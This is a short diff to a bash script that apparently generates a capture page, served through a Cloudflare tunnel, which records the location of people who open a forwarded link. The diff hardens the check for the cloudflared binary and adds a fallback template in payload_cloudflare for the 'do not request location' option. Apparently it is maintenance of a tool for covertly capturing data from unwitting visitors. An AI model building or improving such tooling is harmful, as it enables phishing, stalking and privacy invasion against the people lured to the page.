@@ -169,8 +169,9 @@ done
 }
 
 cloudflare_tunnel() {
-if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
-echo ""
+if [[ -s cloudflared ]] || [[ -s cloudflared.exe ]]; then
+  # cloudflared binary exists and is non-empty — assume usable
+  echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
@@ -289,7 +290,12 @@ payload_cloudflare() {
   # 2 = request but DO NOT save -> use template_request_nosave.php (requests but doesn't post)
   # 3 = do NOT request -> use template_nolocation.php (no geolocation)
   if [[ "$acquire_location" == "3" ]]; then
-    sed 's+forwarding_link+'$link'+g' template_nolocation.php > capture.php
+    # Prefer a dedicated no-location template if present; otherwise fall back to the "request-no-save" template
+    if [[ -f template_nolocation.php ]]; then
+      sed 's+forwarding_link+'$link'+g' template_nolocation.php > capture.php
+    else
+      sed 's+forwarding_link+'$link'+g' template_request_nosave.php > capture.php
+    fi
   elif [[ "$acquire_location" == "2" ]]; then
     sed 's+forwarding_link+'$link'+g' template_request_nosave.php > capture.php
   else
